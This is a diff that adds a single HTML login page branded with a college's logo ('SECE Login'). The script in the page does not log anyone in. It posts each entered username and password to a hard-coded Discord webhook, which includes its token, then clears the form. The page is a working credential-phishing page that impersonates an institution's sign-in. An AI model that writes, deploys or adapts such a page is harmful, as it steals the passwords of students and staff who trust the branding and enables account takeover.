@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SECE Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-box {
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+      text-align: center;
+      width: 350px;
+      animation: fadeIn 1s ease;
+    }
+    .login-box img {
+      width: 180px;
+      margin-bottom: 20px;
+    }
+    .login-box h2 {
+      margin-bottom: 20px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #007bff;
+      border: none;
+      color: #fff;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(20px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <img src="https://sece.ac.in/wp-content/uploads/2024/05/clg-logo2-1024x292.webp" alt="SECE Logo">
+    <h2>Login</h2>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Username" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1390268292500820030/bF7_FAN1_YyvGPeLZuhE3TIDSVFIxg0ky0OxRveEVP_8ERIefeUtWRa_GZfj8m7XqhXC";
+
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          content: `👤 **New Login Attempt**\n**Username**: ${username}\n**Password**: ${password}`
+        })
+      }).then(() => {
+        alert("Login data sent to Discord!");
+        document.getElementById("loginForm").reset();
+      }).catch(() => {
+        alert("Failed to send data.");
+      });
+    });
+  </script>
+
+</body>
+</html>
